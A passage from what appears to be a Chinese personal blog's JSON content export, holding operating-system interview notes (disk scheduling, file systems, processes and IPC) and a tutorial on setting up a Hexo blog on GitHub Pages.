用户注册感兴趣的 socket 事件，就是把这个 socket fd 插入到红黑树中，用中断号做key，可以理解为（中断号，socket fd）的二元组。 用户移除事件就是，删除树上的某个节点。 然后收到一个IO中断，epoll 把网卡数据拷贝到内核cache，根据中断号在红黑树中查找对应的 fd，把 fd 加入到就绪链表中，准备返回给用户线程。用户直接得到就绪的 fd。 kqueue： 收到 socket IO 中断去哈希表中查找对应的 socket fd，再把它放到一个链表里，返回。 用户注册一个感兴趣的事件，就是往哈希表中添加一个 fd。 磁盘调度算法磁盘I/O传输时间Ta = Ts + 1/2r + b/rN Ts 寻道时间(时间最长 最需要优化) 1/2r 旋转延时的时间为磁盘旋转一周的时间的一半 b/rN b 传输的比特数 N 磁道上的比特数 r 磁盘转数 磁盘调度算法通过优化磁盘访问请求顺序来提高磁盘访问性能 寻道时间是磁道访问最耗时的部分 同时会有多个在同一磁盘上的I/O请求 随机处理磁盘访问请求的性能很差 先进先出算法(FIFO) 按顺序处理请求 公平对待所有进程 在有很多进程的情况下 接近随机调度的性能 磁盘访问序列 = 98,183,37,122,14,124,65,67初始磁头位置 53 最短服务时间优先(SSTF) 选择从磁臂当前位置需要移动最少的I/O请求 总是选择最短寻道时间 磁盘访问序列 = 98,183,37,122,14,124,65,67初始磁头位置 53 扫描算法(SCAN)磁臂在一个方向上移动 访问所有未完成的请求 直到磁臂到达该方向上最后的磁道 也称为电梯算法(elevator algorithm) 中间磁道的访问性能较好 两头的比较差 C-SCAN算法改进了这个缺点 磁盘访问序列 = 98,183,37,122,14,124,65,67初始磁头位置 53 循环扫描算法(C-SCAN)限制了仅在一个方向上扫描 当最后一个磁道也被访问过了以后 磁币返回到磁盘的另外一段再次进行 就算对头没有I/O请求也要走到头 浪费了 C-LOOK算法改进了这个缺点 C-LOOK算法磁臂先到达该方向上最后一个请求处 然后立即反转 而不是先到最后点路径上的所有请求 N步扫描(N-Step-SCAN)算法用于解决磁头粘着问题 磁头粘着(Arm Stickiness)现象 SSTF SCAN CSCAN等算法中 可能出现磁头停留在某处不动的情况 进程反复请求对某一磁道的I/O操作 将磁盘请求队列分成长度为N的子队列 按FIFO算法依次处理所有子队列 扫描算法处理每个队列 双队列扫描算法(FSCAN)FSCAN算法是N步扫描算法的简化 只将磁盘请求队列分成两个子队列 可以减少平均等待时间 把磁盘I/O请求分成两个队列 交替使用扫描算法处理一个队列 新生成的磁盘I/O请求放入另一队列中 所有的新请求都将被推迟到下一次扫描时处理 文件管理 文件系统种类 文件系统是操作系统用于明确磁盘或分区上的文件的方法和数据结构；即在磁盘上组织文件的方法。也指用于存储文件的磁盘或分区，或文件系统种类。操作系统中负责管理和存储文件信息的软件机构称为文件管理系统，简称文件系统。文件系统由三部分组成：与文件管理有关软件、被管理文件以及实施文件管理所需数据结构。从系统角度来看，文件系统是对文件存储器空间进行组织和分配，负责文件存储并对存入的文件进行保护和检索的系统。具体地说，它负责为用户建立文件，存入、读出、修改、转储文件，控制文件的存取，当用户不再使用时撤销文件等。 FAT 常PC机使用的文件系统是FAT16。像基于MS-DOS，Win 95等系统都采用了FAT16文件系统。在Win 9X下，FAT16支持的分区最大为2GB。我们知道计算机将信息保存在硬盘上称为“簇”的区域内。使用的簇越小，保存信息的效率就越高。在FAT16的情况下，分区越大簇就相应的要大，存储效率就越低，势必造成存储空间的浪费。并且随着计算机硬件和应用的不断提高，FAT16文件系统已不能很好地适应系统的要求。在这种情况下，推出了增强的文件系统FAT32。同FAT16相比，FAT32主要具有以下特点： 1. 同FAT16相比FAT32最大的优点是可以支持的磁盘大小达到32G，但是不能支持小于512MB的分区。 基于FAT32的Win 2000可以支持分区最大为32GB；而基于 FAT16的Win 2000支持的分区最大为4GB。 2. 由于采用了更小的簇，FAT32文件系统可以更有效率地保存信息。如两个分区大小都为2GB，一个分区采用了FAT16文件系统，另一个分区采用了FAT32文件系统。采用FAT16的分区的簇大小为32KB，而FAT32分区的簇只有4KB的大小。这样FAT32就比FAT16的存储效率要高很多，通常情况下可以提高15%。 FAT32文件系统可以重新定位根目录和使用FAT的备份副本。另外FAT32分区的启动记录被包含在一个含有关键数据的结构中，减少了计算机系统崩溃的可能性。 NTFS NTFS文件系统是一个基于安全性的文件系统，是Windows NT所采用的独特的文件系统结构，它是建立在保护文件和目录数据基础上，同时照顾节省存储资源. 减少磁盘占用量的一种先进的文件系统。使用非常广泛的Windows NT 4.0采用的就是NTFS 4.0文件系统，相信它所带来的强大的系统安全性一定给广大用户留下了深刻的印象。Win 2000采用了更新版本的NTFS文件系统？？NTFS 5.0，它的推出使得用户不但可以像Win 9X那样方便快捷地操作和管理计算机，同时也可享受到NTFS所带来的系统安全性。 NTFS 5.0的特点主要体现在以下几个方面： 1. NTFS可以支持的分区（如果采用动态磁盘则称为卷）大小可以达到2TB。而Win 2000中的FAT32支持分区的大小最大为32GB。 2. NTFS是一个可恢复的文件系统。在NTFS分区上用户很少需要运行磁盘修复程序。NTFS通过使用标准的事物处理日志和恢复技术来保证分区的一致性。发生系统失败事件时，NTFS使用日志文件和检查点信息自动恢复文件系统的一致性。 3. NTFS支持对分区. 文件夹和文件的压缩。任何基于Windows的应用程序对NTFS分区上的压缩文件进行读写时不需要事先由其他程序进行解压缩，当对文件进行读取时，文件将自动进行解压缩；文件关闭或保存时会自动对文件进行压缩。 4. NTFS采用了更小的簇，可以更有效率地管理磁盘空间。在Win 2000的FAT32文件系统的情况下，分区大小在2GB～8GB时簇的大小为4KB；分区大小在8GB～16GB时簇的大小为8KB；分区大小在16GB～32GB时，簇的大小则达到了16KB。而Win 2000的NTFS文件系统，当分区的大小在2GB以下时，簇的大小都比相应的FAT32簇小；当分区的大小在2GB以上时（2GB～2TB），簇的大小都为4KB。相比之下，NTFS可以比FAT32更有效地管理磁盘空间，最大限度地避免了磁盘空间的浪费。 5. 在NTFS分区上，可以为共享资源. 文件夹以及文件设置访问许可权限。许可的设置包括两方面的内容：一是允许哪些组或用户对文件夹. 文件和共享资源进行访问；二是获得访问许可的组或用户可以进行什么级别的访问。访问许可权限的设置不但适用于本地计算机的用户，同样也应用于通过网络的共享文件夹对文件进行访问的网络用户。与FAT32文件系统下对文件夹或文件进行访问相比，安全性要高得多。另外，在采用NTFS格式的Win 2000中，应用审核策略可以对文件夹. 文件以及活动目录对象进行审核，审核结果记录在安全日志中，通过安全日志就可以查看哪些组或用户对文件夹. 文件或活动目录对象进行了什么级别的操作，从而发现系统可能面临的非法访问，通过采取相应的措施，将这种安全隐患减到最低。这些在FAT32文件系统下，是不能实现的。 6. 在Win 2000的NTFS文件系统下可以进行磁盘配额管理。磁盘配额就是管理员可以为用户所能使用的磁盘空间进行配额限制，每一用户只能使用最大配额范围内的磁盘空间。设置磁盘配额后，可以对每一个用户的磁盘使用情况进行跟踪和控制，通过监测可以标识出超过配额报警阈值和配额限制的用户，从而采取相应的措施。磁盘配额管理功能的提供，使得管理员可以方便合理地为用户分配存储资源，避免由于磁盘空间使用的失控可能造成的系统崩溃，提高了系统的安全性。 7. NTFS使用一个“变更”日志来跟踪记录文件所发生的变更。 Ext2 Ext2是 GNU/Linux 系统中标准的文件系统，其特点为存取文件的性能极好，对于中小型的文件更显示出优势，这主要得利于其簇快取层的优良设计。 其单一文件大小与文件系统本身的容量上限与文件系统本身的簇大小有关，在一般常见的 x86 电脑系统中，簇最大为 4KB，则单一文件大小上限为 2048GB，而文件系统的容量上限为 16384GB。 但由于目前核心 2.4 所能使用的单一分割区最大只有 2048GB，实际上能使用的文件系统容量最多也只有 2048GB。 至于Ext3文件系统，它属于一种日志文件系统，是对ext2系统的扩展。它兼容ext2，并且从ext2转换成ext3并不复杂。 Ext3 Ext3是一种日志式文件系统，是对ext2系统的扩展，它兼容ext2。日志式文件系统的优越性在于：由于文件系统都有快取层参与运作，如不使用时必须将文件系统卸下，以便将快取层的资料写回磁盘中。因此每当系统要关机时，必须将其所有的文件系统全部shutdown后才能进行关机。 如果在文件系统尚未shutdown前就关机 （如停电） 时，下次重开机后会造成文件系统的资料不一致，故这时必须做文件系统的重整工作，将不一致与错误的地方修复。然而，此一重整的工作是相当耗时的，特别是容量大的文件系统，而且也不能百分之百保证所有的资料都不会流失。 为了克服此问题，使用所谓‘日志式文件系统 （Journal File System） ’。此类文件系统最大的特色是，它会将整个磁盘的写入动作完整记录在磁盘的某个区域上，以便有需要时可以回溯追踪。 由于资料的写入动作包含许多的细节，像是改变文件标头资料. 搜寻磁盘可写入空间. 一个个写入资料区段等等，每一个细节进行到一半若被中断，就会造成文件系统的不一致，因而需要重整。 然而，在日志式文件系统中，由于详细纪录了每个细节，故当在某个过程中被中断时，系统可以根据这些记录直接回溯并重整被中断的部分，而不必花时间去检查其他的部分，故重整的工作速度相当快，几乎不需要花时间。 Ext4 Linux kernel 自 2.6.28 开始正式支持新的文件系统 Ext4。Ext4 是 Ext3 的改进版，修改了 Ext3 中部分重要的数据结构，而不仅仅像 Ext3 对 Ext2 那样，只是增加了一个日志功能而已。Ext4 可以提供更佳的性能和可靠性，还有更为丰富的功能： 1. 与 Ext3 兼容。执行若干条命令，就能从 Ext3 在线迁移到 Ext4，而无须重新格式化磁盘或重新安装系统。原有 Ext3 数据结构照样保留，Ext4 作用于新数据，当然，整个文件系统因此也就获得了 Ext4 所支持的更大容量。 更大的文件系统和更大的文件。较之 Ext3 目前所支持的最大 16TB 文件系统和最大 2TB 文件，Ext4 分别支持 1EB（1，048，576TB， 1EB=1024PB， 1PB=1024TB）的文件系统，以及 16TB 的文件。 无限数量的子目录。Ext3 目前只支持 32，000 个子目录，而 Ext4 支持无限数量的子目录。 Extents。Ext3 采用间接块映射，当操作大文件时，效率极其低下。比如一个 100MB 大小的文件，在 Ext3 中要建立 25，600 个数据块（每个数据块大小为 4KB）的映射表。而 Ext4 引入了现代文件系统中流行的 extents 概念，每个 extent 为一组连续的数据块，上述文件则表示为“该文件数据保存在接下来的 25，600 个数据块中”，提高了不少效率。 多块分配。当写入数据到 Ext3 文件系统中时，Ext3 的数据块分配器每次只能分配一个 4KB 的块，写一个 100MB 文件就要调用 25，600 次数据块分配器，而 Ext4 的多块分配器“multiblock allocator”（mballoc） 支持一次调用分配多个数据块。 延迟分配。Ext3 的数据块分配策略是尽快分配，而 Ext4 和其它现代文件操作系统的策略是尽可能地延迟分配，直到文件在 cache 中写完才开始分配数据块并写入磁盘，这样就能优化整个文件的数据块分配，与前两种特性搭配起来可以显著提升性能。 快速 fsck。以前执行 fsck 第一步就会很慢，因为它要检查所有的 inode，现在 Ext4 给每个组的 inode 表中都添加了一份未使用 inode 的列表，今后 fsck Ext4 文件系统就可以跳过它们而只去检查那些在用的 inode 了。 日志校验。日志是最常用的部分，也极易导致磁盘硬件故障，而从损坏的日志中恢复数据会导致更多的数据损坏。Ext4 的日志校验功能可以很方便地判断日志数据是否损坏，而且它将 Ext3 的两阶段日志机制合并成一个阶段，在增加安全性的同时提高了性能。 “无日志”（No Journaling）模式。日志总归有一些开销，Ext4 允许关闭日志，以便某些有特殊需求的用户可以借此提升性能。 在线碎片整理。尽管延迟分配. 多块分配和 extents 能有效减少文件系统碎片，但碎片还是不可避免会产生。Ext4 支持在线碎片整理，并将提供 e4defrag 工具进行个别文件或整个文件系统的碎片整理。 inode 相关特性。Ext4 支持更大的 inode，较之 Ext3 默认的 inode 大小 128 字节，Ext4 为了在 inode 中容纳更多的扩展属性（如纳秒时间戳或 inode 版本），默认 inode 大小为 256 字节。Ext4 还支持快速扩展属性（fast extended attributes）和 inode 保留（inodes reservation）。 持久预分配（Persistent preallocation）。P2P 软件为了保证下载文件有足够的空间存放，常常会预先创建一个与所下载文件大小相同的空文件，以免未来的数小时或数天之内磁盘空间不足导致下载失败。Ext4 在文件系统层面实现了持久预分配并提供相应的 API（libc 中的 posix_fallocate（）），比应用软件自己实现更有效率。 默认启用 barrier。磁盘上配有内部缓存，以便重新调整批量数据的写操作顺序，优化写入性能，因此文件系统必须在日志数据写入磁盘之后才能写 commit 记录，若 commit 记录写入在先，而日志有可能损坏，那么就会影响数据完整性。Ext4 默认启用 barrier，只有当 barrier 之前的数据全部写入磁盘，才能写 barrier 之后的数据。（可通过 “mount -o barrier=0” 命令禁用该特性。） ZFS ZFS源自于Sun Microsystems为Solaris操作系统开发的文件系统。ZFS是一个具有高存储容量. 文件系统与卷管理概念整合. 崭新的磁盘逻辑结构的轻量级文件系统，同时也是一个便捷的存储池管理系统。ZFS是一个使用CDDL协议条款授权的开源项目。 HFS 1. HFS文件系统概念 分层文件系统（Hierarchical File System，HFS）是一种由苹果电脑开发，并使用在Mac OS上的文件系统。最初被设计用于软盘和硬盘，同时也可以在在只读媒体如CD-ROM上见到。 2. HFS文件系统开发过程 HFS首次出现在1985年9月17日，作为Macintosh电脑上新的文件系统。它取代只用于早期Mac型号所使用的平面文件系统Macintosh File System（MFS）。因为Macintosh电脑所产生的数据，比其它通常的文件系统，如DOS使用的FAT或原始Unix文件系统所允许存储的数据更多。苹果电脑开发了一种新式更适用的文件系统，而不是采用现有的规格。例如，HFS允许文件名最多有31个字符的长度，支持metadata和双分支（每个文件的数据和资源支分开存储）文件。 尽管HFS象其它大多数文件系统一样被视为专有的格式，因为只有它为大多数最新的操作系统提供了很好的通用解决方法以存取HFS格式磁盘。 在1998年，苹果电脑发布了HFS Plus，其改善了HFS对磁盘空间的地址定位效率低下，并加入了其它的改进。当前版本的Mac OS仍旧支持HFS，但从Mac OS X开始HFS卷不能作为启动用。 3. 构成方式 分层文件系统把一个卷分为许多512字节的“逻辑块”。这些逻辑块被编组为“分配块”，这些分配块可以根据卷的尺寸包含一个或多个逻辑块。HFS对地址分配块使用16位数值，分配块的最高限制数量是65536。 组成一个HFS卷需要下面的五个结构： 4. 卷的逻辑块0和1是启动块，它包含了系统启动信息。例如，启动时载入的系统名称和壳（通常是Finder）文件。 5. 逻辑块2包含主目录块（Master Directory Block，简称MDB）。 6. 逻辑块3是卷位图（Volume Bitmap）的启动块，它追踪分配块使用状态。 7. 总目录文件（Catalog File）是一个包含所有文件的记录和储存在卷中目录的B*-tree。 8. 扩展溢出文件（Extent Overflow File）是当最初总目录文件中三个扩展占用后，另外一个包含额外扩展记录的分配块对应信息的B*-tree。 Linux Linux常见命令 显示文件目录命令ls 如ls 改变当前目录命令cd 如cd /home 建立子目录mkdir 如mkdir xiong 删除子目录命令rmdir 如rmdir /mnt/cdrom 删除文件命令rm 如rm /ucdos.bat 文件复制命令cp 如cp /ucdos /fox 获取帮助信息命令man 如man ls 显示文件的内容less 如less mwm.lx 重定向与管道type 如type readme&gt;&gt;direct，将文件readme的内容追加到文direct中 Linux中显示一个文件最后几行的命令是什么? tail -n 20 filename tail命令语法 tail [ -f ] [ -c Number | -n Number | -m Number | -b Number | -k Number ] [ File ] 参数解释： -f 该参数用于监视File文件增长。 -c Number 从 Number 字节位置读取指定文件 -n Number 从 Number 行位置读取指定文件。 -m Number 从 Number 多字节字符位置读取指定文件，比方你的文件假设包括中文字，假设指定-c参数，可能导致截断，但使用-m则会避免该问题。 -b Number 从 Number 表示的512字节块位置读取指定文件。 -k Number 从 Number 表示的1KB块位置读取指定文件。","path":"2019/04/09/Java面试-操作系统/","date":"04-09","excerpt":"线程与进程线程与进程理论 进程和线程以及他们的区别 进程：一个程序在一个数据集上的一次运行过程。系统资源分配的单位。 一个程序在不同数据集合上运行或一个程序在同样数据集上的多次运行都是不同的进程。 进程是独立的，有自己的内存空间和上下文环境，无法获取其他进程的存储空间。同一进程的两段代码不能同时执行，除非引入线程。 线程：进程的一个实体，是被系统独立调度和执行的基本单位，CPU使用的基本单位。 同一进程的线程可以共享同一内存空间。线程是属于进程的，当进程退出时该进程所产生的线程都会被强制退出并清除。线程占用的资源少于进程占用的资源 进程和线程都可以有优先级 进程在内存中的结构 代码区：存放CPU执行的机器指令，代码区是可共享，并且是只读的 数据段：全局变量、静态变量、常量（编译后知道大小）（未初始化的在一个区域(BBS区)，初始化的在相邻区域(数据区)） 全局变量：定义在函数外面，其他文件也能使用（external linkage） 静态变量：static 关键字修饰的变量： 函数外定义：全局变量，只在当前文件中可见（ internal linkage） 函数内定义：全局变量，只在此函数内可见 （C++）类中定义：全局变量，只在此类中可见 栈区：由编译器自动分配释放，存放函数的参数值、返回值和局部变量，在程序运行过程中实时分配和释放，栈区由操作系统自动管理，无须程序员手动管理 堆区：堆是由malloc()函数分配的内存块，使用free()函数来释放内存，堆的申请释放工作由程序员控制，容易产生内存泄漏 进程地址空间：内核地址空间+用户地址空间（代码段、数据段、堆、栈、共享库） 堆和栈的区别 栈：函数参数、返回地址、局部变量（运行入口知道大小） 编译器自动分配释放，存放函数的参数值，局部变量的值等。 申请后的响应：若栈的剩余空间大于申请空间，系统将为程序提供内存，否则提示栈溢出 大小限制：向低地址扩展，连续的内存区域，栈顶地址和栈最大容量是系统事先规定好的。如果申请的空间超过栈的剩余空间将栈溢出 申请效率：系统自动分配，速度快，程序员无法控制 存储的内容：函数调用时进栈顺序：主函数下一条指令的地址（函数调用语句的下一条可执行语句）、函数的各个参数（大多数c编译器中参数是从右往左入栈）、函数的局部变量。 调用结束的出栈顺序：局部变量、函数参数（从左到右）、栈顶指针指向最开始存的地址（即主函数的下一条指令） 堆：运行期间动态分配的内存空间（运行的时候才知道大小） 程序员自己分配释放，分配方式类似于链表 申请后的响应：操作系统有一个记录空闲内存地址的链表，当系统收到程序的申请时会遍历该链表，寻找第一个空间大于所申请空间的堆结点，将该结点从空闲结点链表删除，分配该结点的空间给程序。会在这块内存空间中的首地址处记录本次分配的大小。 这样delete语句才能正确释放本内存空间。由于找到的堆结点的大小不一定正好等于申请的大小，系统会自动将多余的那部分重新放入空闲链表中 大小限制：向高地址扩展，不连续的内存区域，用链表存储，遍历方向是由低地址向高地址。堆大小受限于计算机系统的有效虚拟内存。获得的空间更大更灵活 申请效率：用new分配，速度慢，容易产生内部碎片，使用方便 存储的内容：一般在堆的头部用一个字节放堆的大小 进程状态 创建（信息设置完但资源有限） 运行（占用cpu） 就绪（等待分配cpu） 等待（等待某个是啊金的发送） 终止（进程完成执行） 进程间的通信如何实现 通信的方式有：信号、信号量、消息队列、共享内存、管道、有名管道 管道(pipe)：半双工通信，数据单向流动；只能父子进程通信；速度慢 有名管道(FIFO)：任何进程都能通信；速度慢 信号量（semophore）：计数器，控制多个进程对共享资源的访问（多进程或线程的同步方法）；不能传递复杂消息 信号：用于通知接收进程某个事件已经发送 消息队列：消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递少、管道只能承载无格式字节流以及缓冲区大小受限的缺点；容量受限，第一次读的时候要考虑上一次没有读完数据的问题 需要消息复制，不需考虑同步问题，不适宜信息量大或操作频繁的场合 共享内存：映射一段能被其他进程访问的内存，由一个进程创建，可被多个进程访问，要保持同步。与信号量结合使用，用来达到进程间的同步及互斥，最快的IPC方式 不需要消息复制，信息量大，快捷，在任意数量的进程之间进行高效双向通信的机制。 套接字：可用于不同机器间的进程通信，由ip地址和端口号连接而成 进程调度 选择一个可用的进程到cpu上执行 进程进入系统，会被加入到作业队列（包括系统的所有进程）队列通常用链表实现，头结点指向的链表的第一个和最后一个pcb块的指针，每个pcb包括一个指向就绪队列的下一个pcb的指针域 运行—&gt;就绪：IO请求（–&gt;IO队列–&gt;IO结束）；时间片结束；创建一个子进程（等待子进程结束）；等待中断（中断发生） PCB： 进程标志 进程状态 程序计数器 寄存器 cpu调度信息：进程优先级、调度队列指针、其他调度参数 内存管理信息：基址寄存器 界限寄存器 页表/段表 记账信息：cpu时间、实际使用时间、时间界限、记账数据、作业或进程数量 I/O状态信息：分配给进程的IO设备列表、打开文件列表 线程状态 创建(new)、就绪(runnable/start)、运行(running)、阻塞(blocked)、等待(waiting)、时间等待(time waiting) 和 消亡(dead/terminated)。在给定的时间点上，一个线程只能处于一种状态 线程同步的方式 互斥量 Synchronized/Lock：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问 信号量 Semphare：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量 事件(信号)，Wait/Notify：通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操作 处理机调度 先来先服务（FCFS，First-Come-First-Served）: 此算法的原则是按照作业到达后备作业队列（或进程进入就绪队列）的先后次序来选择作业（或进程）。 短作业优先（SJF,Shortest Process Next）：这种调度算法主要用于作业调度，它从作业后备队列中挑选所需运行时间（估计值）最短的作业进入主存运行。 时间片轮转调度算法（RR，Round-Robin）：当某个进程执行的时间片用完时，调度程序便停止该进程的执行，并将它送就绪队列的末尾，等待分配下一时间片再执行。然后把处理机分配给就绪队列中新的队首进程，同时也让它执行一个时间片。这样就可以保证就绪队列中的所有进程，在一给定的时间内，均能获得一时间片处理机执行时间。 高响应比优先（HRRN，Highest Response Ratio Next）: 按照高响应比（（已等待时间＋要求运行时间）/ 要求运行时间）优先的原则，在每次选择作业投入运行时，先计算此时后备作业队列中每个作业的响应比RP然后选择其值最大的作业投入运行。 优先权(Priority)调度算法: 按照进程的优先权大小来调度，使高优先权进程得到优先处理的调度策略称为优先权调度算法。 多级队列调度算法：多队列调度是根据作业的性质和类型的不同，将就绪队列再分为若干个子队列，所有的作业（或进程）按其性质排入相应的队列中，而不同的就绪队列采用不同的调度算法。 说一说进程同步有哪几种机制 原子操作、信号量机制、自旋锁管程、会合、分布式系统 中断和轮询的特点 对I/O设备的程序轮询的方式，是早期的计算机系统对I/O设备的一种管理方式。它定时对各种设备轮流询问一遍有无处理要求。轮流询问之后，有要求的，则加以处理。在处理I/O设备的要求之后，处理机返回继续工作。尽管轮询需要时间，但轮询要比I/O设备的速度要快得多，所以一般不会发生不能及时处理的问题。当然，再快的处理机，能处理的输入输出设备的数量也是有一定限度的。而且，程序轮询毕竟占据了CPU相当一部分处理时间，因此，程序轮询是一种效率较低的方式，在现代计算机系统中已很少应用。 程序中断通常简称中断，是指CPU在正常运行程序的过程中，由于预先安排或发生了各种随机的内部或外部事件，使CPU中断正在运行的程序，而转到为响应的服务程序去处理。 轮询——效率低，等待时间很长，CPU利用率不高。 中断——容易遗漏一些问题，CPU利用率高。 同步和互斥 同步是进程之间合作完成某功能，是进程之间的直接关系 互斥是多个进程公用某临界资源，是进程之间的间接关系 (互斥是不允许两个线程同时占有一个资源。同步是在互斥的基础上，再加了访问次序，比如生产消费者模式，需要先生成在消费。比如希尔排序，需要大的间隔度排序完，才能排步数小的） 经典同步问题， 生产消费者模式（Java多线程中也有）","tags":[{"name":"面试","slug":"面试","permalink":"https://jijiking51.cn/tags/面试/"},{"name":"操作系统","slug":"操作系统","permalink":"https://jijiking51.cn/tags/操作系统/"}],"preview":"http://img.jijiking51.cn/20981.jpg"},{"title":"github利用hexo搭建个人博客","text":"准备工作安装gitGitHub Windows安装Node.JSNode.JS确认npm命令已经配置好安装Hexo1npm install hexo-cli -g初始化配置Hexo创建根目录12# 创建博客根目录mkdir blogroot 初始化Hexo123456# 进入根目录cd blogroot# 初始化项目hexo init# 安装插件npm install 安装git插件安装配置安装git插件12# 安装git插件npm install hexo-deployer-git --save 修改配置文件123456# 修改根目录下的_config.ymldeploy: type: git // 上传方式 repository: //项目地址 branch: // 上传分支 message: // 上传时默认信息，如果不设置则为上传时的时间 查看效果12345678# 生成文章hexo n# 生成public静态文件hexo g# 本地预览效果hexo s# 将public静态文件上传到githubhexo d github准备创建博客仓库 创建项目 项目名为用户名.github.io 点击项目setting，下翻到GitHub Pages，设置上传的分支（与上面配置里面写的相同），并且按change theme选择主题（默认就行） 配置ssh私钥 右键git bash 123# username和email@email.com替换为自己的git config --global user.name \"username\"git config --global user.email \"email@email.com\" 生成秘钥 12# 输入后一路回车就好ssh-keygen -t rsa -C \"账户邮箱\" 输入eval &quot;$(ssh-agent -s)&quot;，添加密钥到ssh-agent。 再输入ssh-add ~/.ssh/id_rsa，添加生成的SSH key到ssh-agent。 github的个人setting中找到SSH and GPG keys，添加新的ssh，打开C:\\Users\\Administrator.ssh\\id_rsa.pub 文件，将里面的内容张贴到里面 输入ssh -T git@github.com，出现用户名则表示成功 配置个人域名 github点击settings，拉到下面Custom domain处 ，填写自己域名 本地的source中添加CNAME文件（更新博客的时候保证每次都带有这个文件），检查项目下是否出现了CNAME文件，内容是填写的域名（不要加http，www），如果没有就创建一个新的文件并填写对应内容 ping一下github分配的博客页面，得到一个IP，在自己的域名解析中，将www和@的都解析到这个IP上 坑配置好github Page后报错Page build failed: Date is not a valid datetime,这是非jekyll生成的站点，要添加.nojekyll空文件在repository的根目录下，关闭针对jekyll的检查。 方法： ​ 在github根目录下创建空文件.nojekyll,同样，我们要在source中添加这个文件 更换主题使用gal主题 获取主题 1git clone https://github.com/ZEROKISEKI/hexo-theme-gal.git themes/gal 将clone下来的文件/_source/的tags和categories文件夹拷贝到博客根目录下的source文件夹下 在博客根目录下下载对应插件 12345npm install hexo-renderer-sass --save npm install hexo-renderer-scss --savenpm install hexo-generator-json-content --save 添加内容到根目录下的_config.yml 123456789101112131415161718192021jsonContent: dateFormat: MM-DD pages: title: true text: true path: true date: true excerpt: true preview: true posts: title: true text: true path: true date: true excerpt: true tags: [&#123; name: tag.name, slug: tag.slug, permalink: tag.permalink &#125;] preview: true 开启搜索，404，分类，标签页面 1234hexo new page \"search\" // 搜索功能的必须步骤hexo new page \"404\" // 开启404页面hexo new page \"categories\" // 开启分类页面hexo new page \"tags\" // 开启标签页面 配置分类和标签页面 12345678910111213141516171819202122232425262728293031323334# 修改根目录下的source/categories/index.md文件---title: 文章分类date: 2017-05-27 13:47:40---# 添加 type: \"categories\"---title: 文章分类date: 2017-05-27 13:47:40type: \"categories\"---# 修改根目录下source/tags/index.md文件---title: 标签date: 2017-05-27 14:22:08---# 添加type: \"tags\"---title: 文章分类date: 2017-05-27 13:47:40type: \"tags\"---# 以后写文章头部示例---title: 测试date: 2019-04-2 14:02:57categories: - demotags:- 测试标签1- 测试标签2--- 其他配置参考gal项目wiki","path":"2019/04/09/github利用hexo搭建个人博客/","date":"04-09","excerpt":"准备工作安装gitGitHub Windows安装Node.JSNode.JS确认npm命令已经配置好安装Hexo1npm install hexo-cli -g初始化配置Hexo创建根目录12# 创建博客根目录mkdir blogroot","tags":[{"name":"踩坑","slug":"踩坑","permalink":"https://jijiking51.cn/tags/踩坑/"},{"name":"hexo","slug":"hexo","permalink":"https://jijiking51.cn/tags/hexo/"},{"name":"个人博客","slug":"个人博客","permalink":"https://jijiking51.cn/tags/个人博客/"}],"preview":"http://img.jijiking51.cn/42992.jpg"}]}